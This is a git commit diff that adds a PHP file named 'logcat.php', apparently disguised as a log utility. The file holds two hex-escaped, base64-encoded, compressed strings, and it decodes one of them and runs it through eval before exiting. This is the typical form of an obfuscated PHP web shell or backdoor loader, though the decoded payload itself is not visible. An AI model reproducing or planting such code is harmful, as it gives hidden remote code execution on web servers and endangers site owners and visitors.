e7baf996a37255c5ac46f12bddce9ff27a492dfb
webhostProject <86317362+webhostProject@users.noreply.github.com>
2023-12-04 01:51:17 +0530

    Add files via upload

---
+++ IND/NP/JP/logcat.php
@@ -0,0 +1,6 @@
+<?php
+$Cyto = "Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1K\x42rNK85Pz\x63gqLU4mLq\x43\x43\x63lFqe\x61m\x63Snp\x43\x62np6Rq\x41O0sSi3TUPHJrNBE\x41tY\x41";
+$Lix = "\x3ds1O\x43lP\x41\x41kTM0m41R\x622UIStPEOzskT2S1k\x2bT1s\x437h2LjXFrUp3PT63ZLeWUNjuFT\x63xkP9Hwqv2R\x62p4uplW3nkuyX\x62J\x63fvO\x615r/\x61ot/TnEW/FXMXFXMnl0dgr9SLf8\x636pzu\x63Y\x2b1r93/5e4X/e7tWe7lmee\x2bsv65fjm//5ww\x63nIKSYPGznzDNzdh4ID1xY/YeoZG7hx8F/oMG7jxJe";
+eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
+exit;
+?>
